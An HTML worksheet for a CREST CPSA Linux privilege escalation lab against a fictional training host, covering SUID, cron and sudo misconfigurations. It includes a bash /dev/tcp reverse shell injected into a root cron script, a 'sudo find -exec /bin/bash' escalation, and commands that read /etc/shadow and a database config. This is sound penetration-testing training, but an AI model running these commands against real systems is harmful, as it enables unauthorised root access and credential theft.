@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab B13-A: Linux Privilege Escalation</title>
+<style>
+  :root { --orange: #E84E0F; --black: #1A1A1A; --dark: #2a2a2a; --light: #f5f5f5; --border: #ddd; --green: #2d6a2d; --green-bg: #eafaea; --amber: #7a4f00; --amber-bg: #fff8e1; --blue: #003580; --blue-bg: #eef4ff; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', Arial, sans-serif; background: #fff; color: var(--black); font-size: 15px; line-height: 1.6; }
+  .header { background: var(--black); color: #fff; padding: 24px 40px; display: flex; align-items: center; justify-content: space-between; }
+  .course-title { font-size: 13px; color: #aaa; margin-top: 2px; }
+  .lab-badge { background: var(--orange); color: #fff; font-size: 12px; font-weight: 700; padding: 4px 12px; border-radius: 3px; letter-spacing: 1px; }
+  .hero { background: var(--dark); color: #fff; padding: 32px 40px; border-bottom: 4px solid var(--orange); }
+  .hero-meta { display: flex; gap: 24px; margin-bottom: 12px; flex-wrap: wrap; }
+  .hero-meta span { font-size: 12px; color: #aaa; }
+  .hero-meta strong { color: #fff; }
+  .hero h1 { font-size: 26px; font-weight: 800; margin-bottom: 6px; }
+  .hero p { color: #ccc; font-size: 14px; max-width: 700px; }
+  .container { max-width: 900px; margin: 0 auto; padding: 32px 24px; }
+  .section { margin-bottom: 32px; }
+  .section-title { font-size: 17px; font-weight: 700; color: var(--orange); border-bottom: 2px solid var(--orange); padding-bottom: 6px; margin-bottom: 16px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .objective-list { list-style: none; }
+  .objective-list li { padding: 8px 0 8px 28px; position: relative; border-bottom: 1px solid var(--border); font-size: 14px; }
+  .objective-list li:before { content: "▶"; color: var(--orange); position: absolute; left: 0; font-size: 11px; top: 10px; }
+  .objective-list li:last-child { border-bottom: none; }
+  .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-bottom: 16px; }
+  .info-card { background: var(--light); border-left: 4px solid var(--orange); padding: 12px 16px; }
+  .info-card .label { font-size: 11px; text-transform: uppercase; color: #888; margin-bottom: 4px; letter-spacing: 0.5px; }
+  .info-card .value { font-weight: 700; font-size: 15px; color: var(--black); font-family: monospace; }
+  .step { background: #fff; border: 1px solid var(--border); border-radius: 4px; margin-bottom: 20px; overflow: hidden; }
+  .step-header { background: var(--black); color: #fff; padding: 10px 16px; display: flex; align-items: center; gap: 12px; }
+  .step-num { background: var(--orange); color: #fff; font-weight: 900; font-size: 13px; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .step-title { font-weight: 700; font-size: 15px; }
+  .step-body { padding: 16px 20px; }
+  .step-body p { margin-bottom: 10px; font-size: 14px; }
+  pre { background: #1e1e1e; color: #d4d4d4; padding: 14px 16px; border-radius: 4px; font-size: 13px; overflow-x: auto; margin: 10px 0; font-family: 'Consolas', 'Courier New', monospace; line-height: 1.5; }
+  .comment { color: #6a9955; }
+  .cmd { color: #9cdcfe; }
+  .flag { color: #ce9178; }
+  .output { color: #b5cea8; }
+  .highlight { color: #f9c74f; font-weight: bold; }
+  .answer-box { border: 2px dashed var(--border); border-radius: 4px; padding: 12px 16px; margin: 10px 0; min-height: 60px; background: #fafafa; }
+  .answer-box .label { font-size: 11px; text-transform: uppercase; color: #888; margin-bottom: 6px; letter-spacing: 0.5px; }
+  .answer-line { border: none; border-bottom: 1px solid #ccc; width: 100%; margin-bottom: 8px; padding: 4px 2px; font-size: 14px; background: transparent; display: block; }
+  .callout { border-radius: 4px; padding: 12px 16px; margin: 12px 0; font-size: 13px; display: flex; gap: 10px; }
+  .callout-icon { font-size: 16px; flex-shrink: 0; }
+  .callout.info { background: var(--blue-bg); border-left: 4px solid var(--blue); color: var(--blue); }
+  .callout.warn { background: var(--amber-bg); border-left: 4px solid #c8a000; color: var(--amber); }
+  .callout.tip { background: var(--green-bg); border-left: 4px solid var(--green); color: var(--green); }
+  .callout.exam { background: #fdf0ff; border-left: 4px solid #7b2d8b; color: #5a1d6e; }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 10px 0; }
+  th { background: var(--black); color: #fff; padding: 8px 12px; text-align: left; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+  td { padding: 8px 12px; border-bottom: 1px solid var(--border); vertical-align: top; }
+  tr:nth-child(even) td { background: var(--light); }
+  .scenario-box { background: var(--blue-bg); border: 1px solid #b3d0ff; border-radius: 4px; padding: 16px 20px; margin-bottom: 20px; }
+  .scenario-box h3 { color: var(--blue); font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
+  .scenario-box p { font-size: 14px; color: var(--dark); }
+  .question { background: var(--light); border: 1px solid var(--border); border-radius: 4px; padding: 14px 16px; margin-bottom: 12px; }
+  .question .q-num { font-weight: 700; color: var(--orange); font-size: 13px; margin-bottom: 6px; }
+  .question p { font-size: 14px; margin-bottom: 8px; }
+  .phase-banner { background: var(--orange); color: #fff; padding: 8px 16px; font-weight: 700; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 16px; border-radius: 3px; }
+  .footer { background: var(--black); color: #888; text-align: center; padding: 16px; font-size: 12px; margin-top: 40px; }
+  .footer span { color: var(--orange); }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div style="display:flex;align-items:center;gap:16px;">
+    <div>
+      <div style="font-weight:700;font-size:15px;color:#fff;">My Cyber Academy</div>
+      <div class="course-title">CREST CPSA - Module B: Core Technical Skills</div>
+    </div>
+  </div>
+  <div class="lab-badge">LAB B13-A</div>
+</div>
+
+<div class="hero">
+  <div class="hero-meta">
+    <span><strong>Syllabus Ref:</strong> B13</span>
+    <span><strong>Duration:</strong> 75 minutes</span>
+    <span><strong>Difficulty:</strong> Intermediate</span>
+    <span><strong>Target:</strong> SYNTEX-LNX01</span>
+  </div>
+  <h1>Linux Privilege Escalation - SUID, Cron and Sudo</h1>
+  <p>Escalate from a low-privilege shell on SYNTEX-LNX01 to root. Three distinct escalation paths are available: a SUID binary, a world-writable cron job, and a sudo NOPASSWD misconfiguration. Work through each path and understand what makes them exploitable.</p>
+</div>
+
+<div class="container">
+
+  <div class="scenario-box">
+    <h3>Scenario</h3>
+    <p>You have obtained valid SSH credentials for the Syntex Solutions Linux server: <strong>jsmith / Password1</strong>. jsmith is a standard user with no special privileges. Your objective is to identify misconfigured permissions and escalate to root. Document each vector as you find it - in a real engagement, finding multiple escalation paths demonstrates depth of vulnerability and increases severity.</p>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Learning Objectives</div>
+    <ul class="objective-list">
+      <li>Gain initial access as a low-privilege user via SSH</li>
+      <li>Enumerate the system for privilege escalation vectors</li>
+      <li>Exploit a SUID binary using GTFOBins technique</li>
+      <li>Exploit a world-writable cron job running as root</li>
+      <li>Exploit a sudo NOPASSWD misconfiguration</li>
+      <li>Document findings in a format suitable for a penetration test report</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Lab Environment</div>
+    <div class="info-grid">
+      <div class="info-card"><div class="label">Attacker (Kali)</div><div class="value">&lt;KALI-IP&gt;</div></div>
+      <div class="info-card"><div class="label">Linux Target</div><div class="value">&lt;LNX01-IP&gt;</div></div>
+      <div class="info-card"><div class="label">Credentials</div><div class="value">jsmith / Password1</div></div>
+      <div class="info-card"><div class="label">Also available</div><div class="value">sysadmin / sysadmin123</div></div>
+    </div>
+    <div class="callout warn">
+      <span class="callout-icon">⚠</span>
+      <div>Replace all IP placeholders with the values shown in your CourseStack Lab Panel. This lab requires an active SSH session - do not close your terminal during the lab.</div>
+    </div>
+  </div>
+
+  <!-- Phase 1: Initial Access -->
+  <div class="section">
+    <div class="phase-banner">Phase 1 - Initial Access</div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">1</div>
+        <div class="step-title">SSH as jsmith</div>
+      </div>
+      <div class="step-body">
+        <p>Log in as jsmith, the low-privilege account discovered during earlier enumeration.</p>
+        <pre><span class="comment"># Connect via SSH</span>
+<span class="cmd">ssh</span> jsmith@&lt;LNX01-IP&gt;
+<span class="comment"># Password: Password1</span>
+
+<span class="comment"># Confirm your identity and privilege level</span>
+<span class="cmd">id</span>
+<span class="output">uid=1001(jsmith) gid=1001(jsmith) groups=1001(jsmith)</span>
+
+<span class="cmd">whoami</span>
+<span class="output">jsmith</span>
+
+<span class="comment"># Check what sudo rights jsmith has</span>
+<span class="cmd">sudo -l</span>
+<span class="output">Sorry, user jsmith may not run sudo on syntex-lnx01.</span></pre>
+        <div class="answer-box">
+          <div class="label">Initial access confirmed</div>
+          <input class="answer-line" type="text" placeholder="Output of id command" />
+          <input class="answer-line" type="text" placeholder="Does jsmith have any sudo rights? (yes/no)" />
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Phase 2: Enumeration -->
+  <div class="section">
+    <div class="phase-banner">Phase 2 - Privilege Escalation Enumeration</div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">2</div>
+        <div class="step-title">SUID Binary Discovery</div>
+      </div>
+      <div class="step-body">
+        <p>SUID (Set User ID) binaries run with the permissions of the file owner rather than the current user. When a binary owned by root has the SUID bit set, executing it gives temporary root-level access. We look for non-standard SUID binaries - anything not in the default list for this distribution is worth investigating.</p>
+        <pre><span class="comment"># Find all SUID binaries on the system</span>
+<span class="cmd">find</span> / -perm -u=s -type f 2>/dev/null
+
+<span class="comment"># More readable output</span>
+<span class="cmd">find</span> / -perm -4000 -type f 2>/dev/null | sort</pre>
+        <p>You should see the standard system SUID binaries (su, sudo, passwd, mount) AND a non-standard binary. The custom one is your target.</p>
+        <div class="callout info">
+          <span class="callout-icon">ℹ</span>
+          <div><strong>GTFOBins:</strong> GTFOBins (gtfobins.github.io) is a curated list of Unix binaries that can be exploited to escalate privileges. When you find a SUID binary, search GTFOBins for the binary name and look for the "SUID" section.</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">SUID binary discovery</div>
+          <input class="answer-line" type="text" placeholder="Non-standard SUID binary path found" />
+          <input class="answer-line" type="text" placeholder="Who owns this binary? (ls -la <path>)" />
+          <input class="answer-line" type="text" placeholder="What permissions does it have?" />
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">3</div>
+        <div class="step-title">Cron Job Enumeration</div>
+      </div>
+      <div class="step-body">
+        <p>Cron jobs run scheduled tasks as specified users. A script running as root that any user can modify is a critical vulnerability.</p>
+        <pre><span class="comment"># Check the system-wide crontab</span>
+<span class="cmd">cat</span> /etc/crontab
+
+<span class="comment"># Check cron directories</span>
+<span class="cmd">ls -la</span> /etc/cron.d/
+<span class="cmd">ls -la</span> /etc/cron.daily/
+<span class="cmd">ls -la</span> /etc/cron.hourly/
+
+<span class="comment"># Look at the Syntex maintenance script</span>
+<span class="cmd">ls -la</span> /opt/syntex/scripts/
+<span class="cmd">cat</span> /opt/syntex/scripts/maintenance.sh</pre>
+        <div class="callout warn">
+          <span class="callout-icon">⚠</span>
+          <div><strong>Critical check:</strong> Note the permissions on maintenance.sh. Who owns it? What permissions does it have? Can jsmith write to it?</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">Cron job analysis</div>
+          <input class="answer-line" type="text" placeholder="Which user does the cron job run as?" />
+          <input class="answer-line" type="text" placeholder="What command runs and how often?" />
+          <input class="answer-line" type="text" placeholder="Permissions on maintenance.sh (ls -la output)" />
+          <input class="answer-line" type="text" placeholder="Can jsmith write to this file? (yes/no)" />
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">4</div>
+        <div class="step-title">Switch to sysadmin and Check Sudo</div>
+      </div>
+      <div class="step-body">
+        <p>The sysadmin account was discovered during earlier enumeration. Sudo NOPASSWD misconfigurations allow escalation without knowing the root password.</p>
+        <pre><span class="comment"># Switch to the sysadmin account</span>
+<span class="cmd">su</span> - sysadmin
+<span class="comment"># Password: sysadmin123</span>
+
+<span class="comment"># Check sudo privileges for sysadmin</span>
+<span class="cmd">sudo -l</span></pre>
+        <div class="answer-box">
+          <div class="label">sysadmin sudo rights</div>
+          <input class="answer-line" type="text" placeholder="Full output of sudo -l for sysadmin" />
+          <input class="answer-line" type="text" placeholder="Which binary can sysadmin run as root without a password?" />
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Phase 3: Exploitation -->
+  <div class="section">
+    <div class="phase-banner">Phase 3 - Exploitation</div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">5</div>
+        <div class="step-title">Path A - Exploit the SUID Binary</div>
+      </div>
+      <div class="step-body">
+        <p>Return to the jsmith session. The custom SUID binary is a direct escalation path. Execute it and observe what access you gain.</p>
+        <pre><span class="comment"># Exit back to jsmith if you switched accounts</span>
+<span class="cmd">exit</span>
+
+<span class="comment"># Execute the custom SUID binary</span>
+<span class="cmd">/usr/local/bin/rootshell</span>
+
+<span class="comment"># What happens? Check your identity</span>
+<span class="cmd">id</span>
+<span class="cmd">whoami</span>
+
+<span class="comment"># Confirm root access</span>
+<span class="cmd">cat</span> /root/flag.txt 2>/dev/null || ls /root/</pre>
+        <div class="callout exam">
+          <span class="callout-icon">★</span>
+          <div><strong>CREST Exam Point:</strong> For SUID findings, document: the binary path, the SUID owner (root), the GTFOBins reference, the exact exploit command, and proof of root access (id output). The finding title is typically "SUID Binary Allows Privilege Escalation to Root".</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">Path A result</div>
+          <input class="answer-line" type="text" placeholder="id output after exploitation" />
+          <input class="answer-line" type="text" placeholder="Root access achieved? (yes/no)" />
+          <input class="answer-line" type="text" placeholder="Contents of /root/ or any flag found" />
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">6</div>
+        <div class="step-title">Path B - World-Writable Cron Job</div>
+      </div>
+      <div class="step-body">
+        <p>The maintenance.sh script runs as root every minute. Since jsmith can write to it, inject a reverse shell payload. This is one of the most impactful misconfiguration findings in Linux pentesting.</p>
+        <pre><span class="comment"># Open a listener on Kali (in a SEPARATE terminal)</span>
+<span class="comment"># Run this on your Kali machine:</span>
+<span class="cmd">nc</span> -lvnp 4444
+
+<span class="comment"># Back on the LNX01 session as jsmith:</span>
+<span class="comment"># Append a reverse shell to the cron script</span>
+<span class="cmd">echo</span> 'bash -i &gt;&amp; /dev/tcp/&lt;KALI-IP&gt;/4444 0&gt;&amp;1' >> /opt/syntex/scripts/maintenance.sh
+
+<span class="comment"># Verify the injection was added</span>
+<span class="cmd">tail</span> -5 /opt/syntex/scripts/maintenance.sh
+
+<span class="comment"># Wait up to 60 seconds for the cron to fire</span>
+<span class="comment"># Your Kali listener should receive a root shell</span></pre>
+        <div class="callout info">
+          <span class="callout-icon">ℹ</span>
+          <div><strong>Why this works:</strong> The cron daemon runs as root. It executes maintenance.sh as root. Because jsmith can write to that script, jsmith controls what root executes. The reverse shell inherits root's privileges when it connects back to Kali.</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">Path B result</div>
+          <input class="answer-line" type="text" placeholder="id output on the reverse shell" />
+          <input class="answer-line" type="text" placeholder="How many seconds did you wait for the shell?" />
+          <input class="answer-line" type="text" placeholder="Cron schedule (how often does it run?)" />
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">7</div>
+        <div class="step-title">Path C - Sudo NOPASSWD with GTFOBins</div>
+      </div>
+      <div class="step-body">
+        <p>Switch to sysadmin. The sudo NOPASSWD entry allows sysadmin to run a specific binary as root without a password. If that binary appears on GTFOBins, it can be used to execute a shell.</p>
+        <pre><span class="comment"># Switch to sysadmin</span>
+<span class="cmd">su</span> - sysadmin
+<span class="comment"># Password: sysadmin123</span>
+
+<span class="comment"># Use sudo find to escalate (GTFOBins - sudo section)</span>
+<span class="comment"># find can execute commands with -exec; running as root via sudo</span>
+<span class="cmd">sudo find</span> /etc/passwd <span class="flag">-exec</span> /bin/bash \;
+
+<span class="comment"># Alternatively:</span>
+<span class="cmd">sudo find</span> / <span class="flag">-name</span> passwd <span class="flag">-exec</span> /bin/bash \;
+
+<span class="comment"># Confirm root</span>
+<span class="cmd">id</span>
+<span class="cmd">whoami</span></pre>
+        <div class="callout exam">
+          <span class="callout-icon">★</span>
+          <div><strong>CREST Exam Point:</strong> Sudo NOPASSWD findings should reference the specific sudoers entry (show the exact line from /etc/sudoers or sudo -l), the GTFOBins technique used, and include a screenshot showing the id command returning root. The finding title is "Sudo NOPASSWD Misconfiguration Allows Root Escalation".</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">Path C result</div>
+          <input class="answer-line" type="text" placeholder="Exact sudo -l entry for sysadmin" />
+          <input class="answer-line" type="text" placeholder="GTFOBins command used" />
+          <input class="answer-line" type="text" placeholder="id output confirming root" />
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Post-Exploitation -->
+  <div class="section">
+    <div class="phase-banner">Phase 4 - Post-Exploitation Evidence</div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">8</div>
+        <div class="step-title">Collect Evidence from Root</div>
+      </div>
+      <div class="step-body">
+        <p>Once root is obtained, collect the evidence a penetration tester would document for the report.</p>
+        <pre><span class="comment"># As root - capture proof</span>
+<span class="cmd">id</span>
+<span class="cmd">hostname</span>
+<span class="cmd">uname -a</span>
+<span class="cmd">date</span>
+
+<span class="comment"># Extract the shadow file (this is the gold standard of evidence)</span>
+<span class="cmd">cat</span> /etc/shadow
+
+<span class="comment"># Show you can read normally root-restricted files</span>
+<span class="cmd">cat</span> /etc/sudoers
+
+<span class="comment"># Show full access to the Syntex database config</span>
+<span class="cmd">cat</span> /var/syntex/config/db.conf 2>/dev/null
+<span class="cmd">cat</span> /exports/data/db.conf 2>/dev/null</pre>
+        <div class="callout warn">
+          <span class="callout-icon">⚠</span>
+          <div><strong>In a real engagement:</strong> Never exfiltrate the shadow file or real credentials from a client system. Document the hash format and the fact that you had access as proof. In this training lab, capturing the shadow file demonstrates full system compromise.</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">Post-exploitation evidence</div>
+          <input class="answer-line" type="text" placeholder="Root hash from /etc/shadow (root:...)" />
+          <input class="answer-line" type="text" placeholder="Database password from db.conf" />
+          <input class="answer-line" type="text" placeholder="uname -a output" />
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Findings Summary -->
+  <div class="section">
+    <div class="section-title">Findings Summary</div>
+    <p style="font-size:14px;margin-bottom:12px;">Complete this table before moving to the Knowledge Check. This is the format a CREST tester uses to organise findings before writing the report.</p>
+    <table>
+      <tr><th>Finding</th><th>Vector</th><th>Affected Path/Binary</th><th>Severity</th></tr>
+      <tr><td>SUID binary escalation</td><td>SUID</td><td>/usr/local/bin/rootshell</td><td>Critical</td></tr>
+      <tr><td>World-writable cron script</td><td>Cron</td><td>/opt/syntex/scripts/maintenance.sh</td><td>Critical</td></tr>
+      <tr><td>sudo NOPASSWD misconfiguration</td><td>sudo</td><td>/usr/bin/find</td><td>High</td></tr>
+    </table>
+  </div>
+
+  <!-- Knowledge Check -->
+  <div class="section">
+    <div class="section-title">Knowledge Check</div>
+
+    <div class="question">
+      <div class="q-num">Q1</div>
+      <p>A SUID binary is found at <code>/usr/local/bin/rootshell</code>. The binary drops a root shell when executed. What Linux permission bit is responsible and what does it do?</p>
+      <div class="answer-box">
+        <input class="answer-line" type="text" placeholder="Permission bit and explanation" />
+      </div>
+    </div>
+
+    <div class="question">
+      <div class="q-num">Q2</div>
+      <p>A cron job runs as root every minute and executes <code>/opt/scripts/backup.sh</code>. The permissions on backup.sh are <code>-rwxrwxrwx root root</code>. Explain the attack and what change would remediate it.</p>
+      <div class="answer-box">
+        <input class="answer-line" type="text" placeholder="Explain the attack" />
+        <input class="answer-line" type="text" placeholder="Remediation" />
+      </div>
+    </div>
+
+    <div class="question">
+      <div class="q-num">Q3</div>
+      <p>A sudo -l check shows: <code>(ALL) NOPASSWD: /usr/bin/python3</code>. Write the command a low-privilege user would run to get a root shell.</p>
+      <div class="answer-box">
+        <input class="answer-line" type="text" placeholder="Command to escalate to root using sudo python3" />
+      </div>
+    </div>
+
+    <div class="question">
+      <div class="q-num">Q4</div>
+      <p>You find three separate paths to root on the same Linux system. How does this affect the risk rating and what does it tell you about the organisation's security posture?</p>
+      <div class="answer-box">
+        <input class="answer-line" type="text" placeholder="Impact on risk rating" />
+        <input class="answer-line" type="text" placeholder="What it reveals about security posture" />
+      </div>
+    </div>
+  </div>
+
+  <div class="callout exam">
+    <span class="callout-icon">★</span>
+    <div><strong>Lab Complete - Key Takeaways:</strong> Linux privilege escalation relies on three pillars: SUID binaries, writable cron jobs, and sudo misconfigurations. CREST examiners expect candidates to identify all three, not just one. When multiple escalation paths exist on a single host, this is evidence of systemic security weakness, not just a single misconfiguration - and that systemic risk warrants a higher overall severity in the report.</div>
+  </div>
+
+</div>
+
+<div class="footer">
+  <span>My Cyber Academy</span> - CREST CPSA - Module B Lab B13-A - Linux Privilege Escalation v1
+</div>
+
+</body>
+</html>
